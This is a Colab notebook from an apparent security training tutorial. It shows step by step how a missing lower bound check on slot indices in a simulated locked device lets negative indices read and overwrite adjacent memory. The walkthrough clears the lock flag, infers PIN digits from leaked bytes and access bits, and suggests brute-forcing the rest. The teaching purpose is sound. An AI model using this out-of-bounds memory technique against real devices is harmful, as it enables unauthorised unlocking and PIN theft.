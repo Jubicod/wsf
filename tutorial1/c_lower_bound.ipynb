{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyOI3oxwno8+4v0mTxx38zjH",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/Jubicod/wsf/blob/main/tutorial1/c_lower_bound.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Exploiting the **lower bound** bug\n"
      ],
      "metadata": {
        "id": "nW0s7jOl593e"
      }
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "WwretyST517c"
      },
      "outputs": [],
      "source": [
        "!git clone https://github.com/Jubicod/wsf.git\n",
        "%run wsf/tutorial1/install.ipynb"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "app = App()\n",
        "app.send('S')"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "6_zsSXQA5_df",
        "outputId": "7d4bc744-f646-4492-daff-daf3a5a7d141"
      },
      "execution_count": 24,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "ready...\n",
            "S\n",
            "device locked\n",
            "0  RW-L\n",
            "1  RW-L\n",
            "2  RW-L\n",
            "3  R--L\n",
            "4  R-IL\n",
            "5  RW--\n",
            "6  R---\n",
            "7  ----\n",
            "ok\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "424"
            ]
          },
          "metadata": {},
          "execution_count": 24
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# read and write commands require the slot index to be between 0 and 7\n",
        "# what happens if we pass a higher index ?\n",
        "app.send_read_slot(8)\n",
        "app.send_read_slot(9)\n",
        "app.send_read_slot(10)\n",
        "app.send_read_slot(11)\n",
        "app.send_write_slot(8,55)\n",
        "app.send_write_slot(9,55)\n",
        "app.send_write_slot(10,55)\n",
        "app.send_write_slot(11,55)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "viimFuY96okF",
        "outputId": "22b19a2d-8feb-4a57-abbe-df890b68f0d5"
      },
      "execution_count": 6,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "r8\n",
            "error\n",
            "r9\n",
            "error\n",
            "r:\n",
            "error\n",
            "r;\n",
            "error\n",
            "w855\n",
            "error\n",
            "w955\n",
            "error\n",
            "w:55\n",
            "error\n",
            "w;55\n",
            "error\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# seems there is a higher bound check (could confirm by checking all possible slots)\n",
        "# is there a lower one ? let's try negative slots\n",
        "app.send_read_slot(-1)\n",
        "app.send_read_slot(-2)\n",
        "app.send_read_slot(-3)\n",
        "app.send_read_slot(-4)\n",
        "app.send_write_slot(-1,55)\n",
        "app.send_write_slot(-2,55)\n",
        "app.send_write_slot(-3,55)\n",
        "app.send_write_slot(-4,55)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "qjspzWzpD-_q",
        "outputId": "d810e1c7-fcf6-4699-a690-fa4fb922e597"
      },
      "execution_count": 8,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "r/\n",
            "error\n",
            "r.\n",
            "error\n",
            "r-\n",
            "1\n",
            "ok\n",
            "r,\n",
            "error\n",
            "w/55\n",
            "error\n",
            "w.55\n",
            "error\n",
            "w-55\n",
            "ok\n",
            "w,55\n",
            "error\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# interesting, seems -3 is authorized both for writing and reading\n",
        "# seems a lower bound check is missing\n",
        "# can we exploit it ? let's have a closer look at slot -3\n",
        "\n",
        "# let's see its value after power up\n",
        "app = App()\n",
        "app.send_read_slot(-3)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "V_tS65QoGZHP",
        "outputId": "ea13898f-3c5e-479b-a997-5b48dfe59486"
      },
      "execution_count": 2,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "ready...\n",
            "r-\n",
            "1\n",
            "ok\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# value is 1. maybe it's a boolean. let's write 0 in it and check status\n",
        "app.send_write_slot(-3, 0)\n",
        "app.send('S')\n",
        "# we unlocked the device !!! seems this boolean was holding the locking state !"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "CaL4JeDqHDNg",
        "outputId": "d85258f5-7c0c-47c1-c00a-a7494963e782"
      },
      "execution_count": 3,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "w-0\n",
            "ok\n",
            "S\n",
            "device unlocked\n",
            "0  RW-L\n",
            "1  RW-L\n",
            "2  RW-L\n",
            "3  R--L\n",
            "4  R-IL\n",
            "5  RW--\n",
            "6  R---\n",
            "7  ----\n",
            "ok\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "242"
            ]
          },
          "metadata": {},
          "execution_count": 3
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# White box hacking\n",
        "the format string bug allows to dump and reverse the firmware and the slots\n",
        "\n",
        "Looking at binary (or source code) you can see reverse the structure of the slots:\n",
        "\n",
        "```\n",
        "struct slot_s\n",
        "{\n",
        "\tunsigned char value;\n",
        "\tunsigned char access; /* 1 for READ, 2 for WRITE, 4 for INCREMENT, 8 for UNLOCKED */\n",
        "};\n",
        "\n",
        "struct info_s\n",
        "{\n",
        "  char           locked;\n",
        "  char           error; / set to 0xFF before starting */\n",
        "  unsigned char password[4];\n",
        "  struct slot_s slot[MAX_SLOT];\n",
        "};\n",
        "```\n",
        "\n",
        "the memory looks like that\n",
        "* locked ...... slot -3 value\n",
        "* error ........ slot -3 rights\n",
        "---\n",
        "* PIN #1 ....... slot -2 value\n",
        "* PIN #2 ....... slot -2 rights\n",
        "---\n",
        "* PIN #3 ....... slot -1 value\n",
        "* PIN #4 ....... slot -1 rights\n",
        "---\n",
        "* slot0  ....... slot 0   value\n",
        "*                slot 0   rights\n",
        "---\n",
        "...\n",
        "\n",
        "let's try to get the PIN code (in case it has been changed from the one in the code)\n"
      ],
      "metadata": {
        "id": "zRDGhRKzJTNT"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "app = App()\n",
        "app.send_write_slot(-3,0) # unlock\n",
        "print(\"slot -1 ----------------\")\n",
        "app.send_read_slot(-1)\n",
        "app.send_write_slot(-1,0)\n",
        "app.send_increment_slot(-1)\n",
        "print(\"slot -2 ----------------\")\n",
        "app.send_read_slot(-2)\n",
        "app.send_write_slot(-2,0)\n",
        "app.send_increment_slot(-2)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "z_hn7rq8JRe0",
        "outputId": "3b56bc04-1683-4e4d-b314-55232d8710f1"
      },
      "execution_count": 7,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "ready...\n",
            "w-0\n",
            "ok\n",
            "slot -1 ----------------\n",
            "r/\n",
            "error\n",
            "w/0\n",
            "error\n",
            "i/\n",
            "ok\n",
            "slot -2 ----------------\n",
            "r.\n",
            "50\n",
            "ok\n",
            "w.0\n",
            "ok\n",
            "i.\n",
            "error\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# slot -1 is not writable, not readable, but can be incremented, so it's access right least significant 3 bits are 1,0, and 0 (4). PIN#4 ends with 4, since it's an ascii digit it is probably \"4\"\n",
        "# slot -2 is writable, readable, but not incrementable, so access right last 3 bits are 0,1 and 1 (3). PIN#2 is probably \"2\"\n",
        "# PIN#1 is directly readable in slot -2 (50 -> \"2\")\n",
        "# so only PIN#3 is missing, but it easy to recover by bruteforcing since we have the others 3 PIN digit"
      ],
      "metadata": {
        "id": "X6Zy-DajLmJe"
      },
      "execution_count": 5,
      "outputs": []
    }
  ]
}